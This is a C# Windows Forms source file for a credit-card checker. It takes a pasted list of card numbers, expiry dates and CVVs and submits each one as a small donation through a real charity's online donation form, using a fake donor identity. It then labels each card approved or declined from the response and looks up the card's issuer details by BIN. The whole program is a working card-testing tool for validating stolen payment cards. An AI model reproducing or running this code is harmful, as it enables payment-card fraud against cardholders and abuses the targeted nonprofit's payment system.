using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace HSBC
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            llenarComboCountry();
            llenarComboState();
        }

        private async void INICIAR_Click(object sender, EventArgs e)
        {
            sp = false;
            foreach (var lin in lista.Text)
            {
                if (lista.Text != "") {
                    if (sp == false ) { 
                    try
                    {

                
                string cc = lista.Lines[0];
                string country = comboBox1.SelectedItem.ToString();
                string state = comboBox2.SelectedItem.ToString();
                string city = txt_city.Text;
                string zip = txt_zip.Text;
                string[] linha = cc.Split('|');
                            string mess = formatMes(linha[1]);
                var resposta = await chk(linha[0], mess , linha[2], linha[3],country,state,city,zip);
                List<string> newList = lista.Lines.ToList();
                    string bin = cc.Substring(0, 6);
                    if (resposta.Contains("The credit card was declined. Please check the information that you entered"))
                {
                        string con = await consulta(bin);
                        rp.Text += "REPROVADA ❌ " + cc + con + Environment.NewLine;
                    newList.RemoveAt(0);
                    lista.Lines = newList.ToArray();
                }
                else if (resposta.Contains("There was a problem processing your request."))
                     {
                                string con = await consulta(bin);
                                rp.Text += "DESCONOCIDA ❌ " + cc + con + Environment.NewLine;
                                newList.RemoveAt(0);
                                lista.Lines = newList.ToArray();
                            }
                            else{
 
                                string con = await consulta(bin);

                                ap.Text += "APROVADA ✅ " + cc + con + Environment.NewLine;
                                newList.RemoveAt(0);
                                lista.Lines = newList.ToArray();
                            }
                    }
                    catch
                    {

                    }
                       }
                }
            }
        }
        static public async Task<string> chk(string cc, string mes, string ano, string cvv,string country,string state,string city,string zipcode)
        {
            
            //string URL = "https://website.com/donate";
            //CookieContainer MyCookies = new CookieContainer();
            //ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            //HttpWebRequest request = WebRequest.CreateHttp(URL);
            //request.CookieContainer = MyCookies;
            //request.Method = "POST";

            //byte[] data = Encoding.UTF8.GetBytes("user_donation_amt=%2410.00&company_min_matching_amt=&currency_locale=en_US&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=2027&level_flexibleexpanded2027amount=%2410.00&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&matching_giftsubmit=true&donor_employername=&donor_employersubmit=true&billing_first_namename=Peter&billing_first_namesubmit=true&billing_last_namename=Saterin&billing_last_namesubmit=true&billing_addr_street1name=Street+1234&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=" + city + "&billing_addr_citysubmit=true&billing_addr_state=" + state + "&billing_addr_statesubmit=true&billing_addr_zipname=" + zipcode + "&billing_addr_zipsubmit=true&billing_addr_country=" + country + "&billing_addr_countrysubmit=true&donor_email_addressname=covobaha%40g-mailix.com&donor_email_addresssubmit=true&donor_email_opt_insubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername=" + number1 + "+" + number2 + "+" + number3 + "+" + number4 + "&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH=" + mes + "&responsive_payment_typecc_exp_date_YEAR=" + ano + "&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname=" + cvv + "&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&send_ecardsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1201&select_gridsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&pstep_finish=Process&idb=204713667&df_id=1523&mfc_pref=T&1523.donation=form1");
            //request.ContentType = "application/x-www-form-urlencoded";
            //request.ContentLength = data.Length;
            //Stream dataStream = request.GetRequestStream();
            //dataStream.Write(data, 0, data.Length);
            //dataStream.Close();          
            //request.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
            //WebResponse response = request.GetResponse();
            ///Stream Stream = response.GetResponseStream();
            //StreamReader reader = new StreamReader(Stream);
            //string pagina = reader.ReadToEnd();


            //string rs =  OpaGet(Pagina, "name=\"_token\"", "value=\"","\"");

            //HttpClientHandler HttpCLientHandler = new HttpClientHandler();
            //HttpCLientHandler.CookieContainer = MyCookies;
            //HttpClient HC = new HttpClient(HttpCLientHandler);
            HttpClient HC = new HttpClient();

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12 | SecurityProtocolType.Ssl3;
            string number1 = cc.Substring(0, 4);
            string number2 = cc.Substring(4, 4);
            string number3 = cc.Substring(8, 4);
            string number4 = cc.Substring(12, 4);
            string Post = "user_donation_amt=%2410.00&company_min_matching_amt=&currency_locale=en_US&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=2027&level_flexibleexpanded2027amount=%2410.00&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&matching_giftsubmit=true&donor_employername=&donor_employersubmit=true&billing_first_namename=Peter&billing_first_namesubmit=true&billing_last_namename=Saterin&billing_last_namesubmit=true&billing_addr_street1name=Street+1234&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname="+city+"&billing_addr_citysubmit=true&billing_addr_state="+state+"&billing_addr_statesubmit=true&billing_addr_zipname="+zipcode+"&billing_addr_zipsubmit=true&billing_addr_country="+country+ "&billing_addr_countrysubmit=true&donor_email_addressname=covobaha%40g-mailix.com&donor_email_addresssubmit=true&donor_email_opt_insubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername=" + number1 + "+" + number2 + "+" + number3 + "+" + number4 + "&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH=" + mes+"&responsive_payment_typecc_exp_date_YEAR="+ano+"&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname="+cvv+"&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&send_ecardsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1201&select_gridsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&pstep_finish=Process&idb=204713667&df_id=1523&mfc_pref=T&1523.donation=form1";
            HC.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36");
            StringContent StringContent = new StringContent(Post, Encoding.UTF8, "application/x-www-form-urlencoded");
            HttpResponseMessage result = await HC.PostAsync(new Uri("https://secure2.convio.net/unfpa/site/Donation2"), StringContent);
            string final = await result.Content.ReadAsStringAsync();
            return final;
            
        }
        static public async Task<string> consulta(string biin)
        {
            HttpClient HC = new HttpClient();
            Random rd = new Random();
            int sorteado = rd.Next(0,9);
            string[] valores = new string[10]{ "R$ 1,00" , "R$ 5,00", "R$ 1,40", "R$ 4,80", "R$ 2,00", "R$ 7,00", "R$ 10,00", "R$ 3,00", "R$ 3,40", "R$ 5,50" };
            string pagina = await HC.GetStringAsync("https://www.cardbinlist.com/search.html?bin=" + biin);
            string pais = OpaGet(pagina , "Country Issuer</th>", "target=\"_blank\">", "</a>");
            //string banco = OpaGet(pagina, "<th>Bank Issuer</th>", "<td>", "</td>");
            //string site = OpaGet(pagina, "<th>Bank Web URL</th>", "<td>", "</td>");
            string nivel = OpaGet(pagina, "<th>Sub Brand</th>", "target=\"_blank\">", "</a>");
            string tipo = OpaGet(pagina, "<th>Type</th>", "target=\"_blank\">", "</a>");
            string bandeira = OpaGet(pagina, "Brand (Financial Service)</th>", "target=\"_blank\">", "</a>");
            //string fono = OpaGet(pagina, "<th>Bank Telephone</th>", "<td>", "</td>");
            string debitou = valores[sorteado];
            return " | Informacion | PAIS: "+pais+ " | NIVEL: " + nivel + " | TIPO: " + tipo + " | COMPANY: " + bandeira + " | BIN: " + biin + " | DEBITO: "+ debitou + " | #NIC0L4 T3SLA";
        }
        Boolean sp;
        
        private void PAUSAR_Click(object sender, EventArgs e)
        {
            sp = true;
        }
        public static string OpaGet(string PaginaToken, string _a, string _b, string _c)
        {
            string a = _a;
            string b = _b;
            int c = PaginaToken.IndexOf(a);
            int d = PaginaToken.IndexOf(b, c);
            int es = (d + b.Length);
            int f = PaginaToken.IndexOf(_c, es);
            return PaginaToken.Substring(es, (f - es));
        }

        public string formatMes(string mess)
        {
            string  m = mess;
            if (mess.Length == 2 && mess != "10" && mess != "11" && mess != "12"){
		        m =mess.Replace("0", "");
            }else{
                return m;
            }

            return m;
        }
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
         
        }
        
        public void llenarComboCountry()
        {
            comboBox1.Items.Add("United States");
            comboBox1.Items.Add("Afghanistan");
            comboBox1.Items.Add("Aland Islands");
            comboBox1.Items.Add("Albania");
            comboBox1.Items.Add("Algeria");
            comboBox1.Items.Add("American Samoa");
            comboBox1.Items.Add("Andorra");
            comboBox1.Items.Add("Angola");
            comboBox1.Items.Add("Anguilla");
            comboBox1.Items.Add("Antarctica");
            comboBox1.Items.Add("Argentina");
            comboBox1.Items.Add("Armenia");
            comboBox1.Items.Add("Aruba");
            comboBox1.Items.Add("Australia");
            comboBox1.Items.Add("Austria");
            comboBox1.Items.Add("Bahamas");
            comboBox1.Items.Add("Bangladesh");
            comboBox1.Items.Add("Belgium");
            comboBox1.Items.Add("Bermuda");
            comboBox1.Items.Add("Brazil");
            comboBox1.Items.Add("Bulgaria");
            comboBox1.Items.Add("Cambodia");
            comboBox1.Items.Add("Cameroon");
            comboBox1.Items.Add("Canada");
            comboBox1.Items.Add("Cayman Islands");
            comboBox1.Items.Add("Chad");
            comboBox1.Items.Add("Chile");
            comboBox1.Items.Add("China");
            comboBox1.Items.Add("Colombia");
            comboBox1.Items.Add("Congo");
            comboBox1.Items.Add("Costa Rica");
            comboBox1.Items.Add("Croatia");
            comboBox1.Items.Add("Cuba");
            comboBox1.Items.Add("Curacao");
            comboBox1.Items.Add("Czech Republic");
            comboBox1.Items.Add("Denmark");
            comboBox1.Items.Add("Dominica");
            comboBox1.Items.Add("Dominican Republic");
            comboBox1.Items.Add("Ecuador");
            comboBox1.Items.Add("Egypt");
            comboBox1.Items.Add("El Salvador");
            comboBox1.Items.Add("Estonia");
            comboBox1.Items.Add("Ethiopia");
            comboBox1.Items.Add("Finland");
            comboBox1.Items.Add("France");
            comboBox1.Items.Add("Gambia");
            comboBox1.Items.Add("Georgia");
            comboBox1.Items.Add("Germany");
            comboBox1.Items.Add("Ghana");
            comboBox1.Items.Add("Gibraltar");
            comboBox1.Items.Add("Greece");
            comboBox1.Items.Add("Greenland");
            comboBox1.Items.Add("Grenada");
            comboBox1.Items.Add("Guadeloupe");
            comboBox1.Items.Add("Guam");
            comboBox1.Items.Add("Guatemala");
            comboBox1.Items.Add("Haiti");
            comboBox1.Items.Add("Honduras");
            comboBox1.Items.Add("Hong Kong");
            comboBox1.Items.Add("Hungary");
            comboBox1.Items.Add("Iceland");
            comboBox1.Items.Add("India");
            comboBox1.Items.Add("Indonesia");
            comboBox1.Items.Add("Iraq");
            comboBox1.Items.Add("Ireland");
            comboBox1.Items.Add("Israel");
            comboBox1.Items.Add("Italy");
            comboBox1.Items.Add("Jamaica");
            comboBox1.Items.Add("Japan");
            comboBox1.Items.Add("Jersey");
            comboBox1.Items.Add("Kenya");
            comboBox1.Items.Add("Kuwait");
            comboBox1.Items.Add("Libya");
            comboBox1.Items.Add("Liechtenstein");
            comboBox1.Items.Add("Lithuania");
            comboBox1.Items.Add("Luxembourg");
            comboBox1.Items.Add("Macao");
            comboBox1.Items.Add("Madagascar");
            comboBox1.Items.Add("Malawi");
            comboBox1.Items.Add("Malaysia");
            comboBox1.Items.Add("Mali");
            comboBox1.Items.Add("Mayotte");
            comboBox1.Items.Add("Mexico");
            comboBox1.Items.Add("Monaco");
            comboBox1.Items.Add("Mongolia");
            comboBox1.Items.Add("Montenegro");
            comboBox1.Items.Add("Montserrat");
            comboBox1.Items.Add("Morocco");
            comboBox1.Items.Add("Mozambique");
            comboBox1.Items.Add("Nauru");
            comboBox1.Items.Add("Nepal");
            comboBox1.Items.Add("Netherlands");
            comboBox1.Items.Add("New Zealand");
            comboBox1.Items.Add("Nicaragua");
            comboBox1.Items.Add("Nigeria");
            comboBox1.Items.Add("Pakistan");
            comboBox1.Items.Add("Panama");
            comboBox1.Items.Add("Paraguay");
            comboBox1.Items.Add("Peru");
            comboBox1.Items.Add("Philippines");
            comboBox1.Items.Add("Poland");
            comboBox1.Items.Add("Portugal");
            comboBox1.Items.Add("Puerto Rico");
            comboBox1.Items.Add("Qatar");
            comboBox1.Items.Add("Republic of Korea");
            comboBox1.Items.Add("Romania");
            comboBox1.Items.Add("Russian Federation");
            comboBox1.Items.Add("Rwanda");
            comboBox1.Items.Add("Samoa");
            comboBox1.Items.Add("Saudi Arabia");
            comboBox1.Items.Add("Senegal");
            comboBox1.Items.Add("Serbia");
            comboBox1.Items.Add("Singapore");
            comboBox1.Items.Add("Slovakia");
            comboBox1.Items.Add("Somalia");
            comboBox1.Items.Add("Spain");
            comboBox1.Items.Add("Sudan");
            comboBox1.Items.Add("Swaziland");
            comboBox1.Items.Add("Sweden");
            comboBox1.Items.Add("Switzerland");
            comboBox1.Items.Add("Taiwan, Province of China");
            comboBox1.Items.Add("Thailand");
            comboBox1.Items.Add("Togo");
            comboBox1.Items.Add("Trinidad and Tobago");
            comboBox1.Items.Add("Tunisia");
            comboBox1.Items.Add("Turkey");
            comboBox1.Items.Add("Uganda");
            comboBox1.Items.Add("Ukraine");
            comboBox1.Items.Add("United Arab Emirates");
            comboBox1.Items.Add("United Kingdom");
            comboBox1.Items.Add("United Republic of Tanzania");
            comboBox1.Items.Add("Uruguay Uruguay");
            comboBox1.Items.Add("USA Minor Outlying Islands");
            comboBox1.Items.Add("Uzbekistan");
            comboBox1.Items.Add("Vanuatu");
            comboBox1.Items.Add("Viet Nam");
            comboBox1.Items.Add("Virgin Islands (British)");
            comboBox1.Items.Add("Virgin Islands (USA)");
            comboBox1.Items.Add("Wallis and Futuna");
            comboBox1.Items.Add("Western Sahara");
            comboBox1.Items.Add("Yemen");
            comboBox1.Items.Add("Zambia");
            comboBox1.Items.Add("Zimbabwe");
        }

        public void llenarComboState()
        {
            comboBox2.Items.Add("None");
            comboBox2.Items.Add("AL");
            comboBox2.Items.Add("AK");
            comboBox2.Items.Add("AS");
            comboBox2.Items.Add("AZ");
            comboBox2.Items.Add("AR");
            comboBox2.Items.Add("AA");
            comboBox2.Items.Add("AE");
            comboBox2.Items.Add("AP");
            comboBox2.Items.Add("CA");
            comboBox2.Items.Add("CO");
            comboBox2.Items.Add("CT");
            comboBox2.Items.Add("DE");
            comboBox2.Items.Add("DC");
            comboBox2.Items.Add("FM");
            comboBox2.Items.Add("FL");
            comboBox2.Items.Add("GA");
            comboBox2.Items.Add("GU");
            comboBox2.Items.Add("HI");
            comboBox2.Items.Add("ID");
            comboBox2.Items.Add("IL");
            comboBox2.Items.Add("IN");
            comboBox2.Items.Add("IA");
            comboBox2.Items.Add("KS");
            comboBox2.Items.Add("KY");
            comboBox2.Items.Add("LA");
            comboBox2.Items.Add("ME");
            comboBox2.Items.Add("MH");
            comboBox2.Items.Add("MD");
            comboBox2.Items.Add("MA");
            comboBox2.Items.Add("MI");
            comboBox2.Items.Add("MN");
            comboBox2.Items.Add("MS");
            comboBox2.Items.Add("MO");
            comboBox2.Items.Add("MT");
            comboBox2.Items.Add("NE");
            comboBox2.Items.Add("NV");
            comboBox2.Items.Add("NH");
            comboBox2.Items.Add("NJ");
            comboBox2.Items.Add("NM");
            comboBox2.Items.Add("NY");
            comboBox2.Items.Add("NC");
            comboBox2.Items.Add("ND");
            comboBox2.Items.Add("OH");
            comboBox2.Items.Add("OK");
            comboBox2.Items.Add("OR");
            comboBox2.Items.Add("PW");
            comboBox2.Items.Add("PA");
            comboBox2.Items.Add("PR");
            comboBox2.Items.Add("RI");
            comboBox2.Items.Add("SC");
            comboBox2.Items.Add("SD");
            comboBox2.Items.Add("TN");
            comboBox2.Items.Add("TX");
            comboBox2.Items.Add("UT");
            comboBox2.Items.Add("VT");
            comboBox2.Items.Add("VI");
            comboBox2.Items.Add("VA");
            comboBox2.Items.Add("WA");
            comboBox2.Items.Add("WV");
            comboBox2.Items.Add("WI");
            comboBox2.Items.Add("WY");
        }

        private void btn_limpiar_Click(object sender, EventArgs e)
        {
            ap.Clear();
            rp.Clear();
        }
    }
}
